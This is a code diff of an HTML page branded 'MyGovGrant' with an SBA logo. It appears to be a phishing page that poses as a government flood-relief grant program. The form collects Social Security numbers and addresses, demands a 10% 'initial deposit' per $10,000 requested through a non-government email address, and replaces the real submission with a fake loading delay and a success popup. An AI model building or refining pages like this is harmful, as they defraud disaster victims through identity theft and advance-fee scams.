@@ -100,7 +100,7 @@
 
         <!-- Header Section -->
         <div class="text-center">
-            <img src="sba.svg" class="mx-auto h-12" alt="SBA Logo">
+            <img src="grant logo.png" class="mx-auto h-12" alt="SBA Logo">
             <h2 class="mt-6 text-3xl font-extrabold text-gray-900 mb-4">
                 MyGovGrant
             </h2>
@@ -170,13 +170,26 @@
                     <input id="ssn" name="ssn" type="password" required class="p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
                 </div>
                 <div>
-                    <label for="confirmSsn" class="block text-sm font-medium text-gray-700">Confirm Social Security Number</label>
-                    <input id="confirmSsn" name="confirmSsn" type="password" required class="p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
-                </div>
+                    <label for="grantamount" class="block text-sm font-medium text-gray-700">Requested grant amount</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-500">$</span>
+                        <input id="grantamount" name="grantamount" type="number" required 
+                               class="p-2 pl-7 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
+                               placeholder="Enter grant amount">
+                    </div>
+                    <p class="text-xs text-gray-500 mt-1">
+                        For every $10,000 grant request, you would be required to settle a 10% initial deposit. Contact 
+                        <a href="mailto:support@visionprobase.tech" class="text-blue-600 underline">support@visionprobase.tech</a> for more information.
+                    </p>                    
+                </div>                
                 <div>
                     <label for="homeAddress" class="block text-sm font-medium text-gray-700">Home Address</label>
                     <input id="homeAddress" name="homeAddress" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="123 Main St">
+                    
+                    <!-- Small Text -->
+                    <p class="text-sm text-gray-500 mt-1">Only addresses affected by the flood will be considered.</p>
                 </div>
+                
                 <div>
                     <label for="city" class="block text-sm font-medium text-gray-700">City</label>
                     <input id="city" name="city" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="City Name">
@@ -191,8 +204,11 @@
                 </div>
                 <div>
                     <label for="country" class="block text-sm font-medium text-gray-700">Country</label>
-                    <input id="country" name="country" type="text" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500" placeholder="Country Name">
-                </div>
+                    <select id="country" name="country" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                        <option value="united-states">United States</option>
+                        <option value="virgin-islands-us">Virgin Islands (U.S.)</option>
+                    </select>
+                </div>                
             </div>
 
             <!-- Step 3: SBA Account -->
@@ -244,7 +260,8 @@
     let currentStep = 1;
 
     function updateStepIndicator() {
-        document.getElementById('step-indicator-text').textContent = `Step ${currentStep}: ${currentStep === 1 ? 'Account Creation' : currentStep === 2 ? 'Personal Details' : 'SBA Account'}`;
+        const stepDescriptions = ['Account Creation', 'Personal Details', 'SBA Account'];
+        document.getElementById('step-indicator-text').textContent = `Step ${currentStep}: ${stepDescriptions[currentStep - 1]}`;
         document.getElementById('step-1-indicator').classList.toggle('bg-green-500', currentStep === 1);
         document.getElementById('step-2-indicator').classList.toggle('bg-green-500', currentStep === 2);
         document.getElementById('step-3-indicator').classList.toggle('bg-green-500', currentStep === 3);
@@ -256,23 +273,31 @@
         document.getElementById('step-3').classList.toggle('hidden', step !== 3);
         document.getElementById('prevBtn').classList.toggle('hidden', step === 1);
         document.getElementById('nextBtn').textContent = step === 3 ? 'Submit' : 'Next Step';
-        updateStepIndicator();
+    }
+
+    function validateStep(step) {
+        const currentStepElement = document.getElementById(`step-${step}`);
+        const inputs = currentStepElement.querySelectorAll('input[required]');
+
+        for (let input of inputs) {
+            if (!input.value) {
+                alert('Please fill out all required fields.');
+                return false;
+            }
+        }
+        return true;
     }
 
     function nextStep() {
-        if (currentStep === 1) {
-            if (validateStep1()) {
-                currentStep++;
-                showStep(currentStep);
-            }
-        } else if (currentStep === 2) {
-            if (validateStep2()) {
-                currentStep++;
-                showStep(currentStep);
-            }
+        if (!validateStep(currentStep)) {
+            return;
+        }
+        if (currentStep < 3) {
+            currentStep++;
+            showStep(currentStep);
+            updateStepIndicator();
         } else {
-            // On the last step, submit the form
-            document.getElementById('multiStepForm').submit();
+            showLoadingState(); // Show loading state before showing confirmation pop-up
         }
     }
 
@@ -280,38 +305,45 @@
         if (currentStep > 1) {
             currentStep--;
             showStep(currentStep);
+            updateStepIndicator();
         }
     }
 
-    // Validation Functions
-    function validateStep1() {
-        const fields = ['fullName', 'email', 'password', 'confirmPassword', 'homePhone', 'mobilePhone'];
-        return validateFields(fields);
+    function showLoadingState() {
+        const nextBtn = document.getElementById('nextBtn');
+        nextBtn.disabled = true;
+        nextBtn.innerHTML = 'Submitting...'; // Show loading state on the button
+
+        // Simulate loading delay, then show success message
+        setTimeout(() => {
+            showSuccessPopup();
+        }, 2000); // Simulate 2 seconds loading time
     }
 
-    function validateStep2() {
-        const fields = ['dob', 'ssn', 'confirmSsn', 'homeAddress', 'city', 'state', 'zipCode', 'country'];
-        return validateFields(fields);
-    }
+    function showSuccessPopup() {
+    const popup = document.createElement('div');
+    popup.classList.add('fixed', 'inset-0', 'bg-black', 'bg-opacity-60', 'flex', 'justify-center', 'items-center', 'z-50');
+    popup.innerHTML = `
+        <div class="bg-white p-8 rounded-lg shadow-2xl w-96 text-center transform transition-transform scale-100 hover:scale-105 duration-300">
+            <h2 class="text-3xl font-bold mb-4 text-blue-600">🎉 Success!</h2>
+            <p class="text-gray-700 mb-6">Your application request has been submitted successfully.<br /> You will be notified about your eligiblity for this grant program via your registered email.</p>
+            <button class="mt-6 bg-blue-500 hover:bg-gray-600 text-white px-6 py-3 w-full rounded shadow-md transition-colors duration-300 ease-in-out" id="goHomeBtn">
+                Go Home
+            </button>
+        </div>
+    `;
 
-    function validateFields(fieldNames) {
-        let isValid = true;
-        fieldNames.forEach(fieldName => {
-            const field = document.getElementById(fieldName);
-            if (!field.value.trim()) {
-                isValid = false;
-                field.classList.add('border-red-500');
-                field.classList.remove('border-gray-300');
-            } else {
-                field.classList.remove('border-red-500');
-                field.classList.add('border-gray-300');
-            }
-        });
-        return isValid;
-    }
+    document.body.appendChild(popup);
 
-    // Initialize form on step 1
-    showStep(1);
+    document.getElementById('goHomeBtn').addEventListener('click', function () {
+        window.location.href = 'index.html'; // Redirect to index.html when "Go Home" is clicked
+    });
+}
+
+    window.onload = function() {
+        showStep(currentStep);
+        updateStepIndicator();
+    };
 </script>
 </body>
 </html>
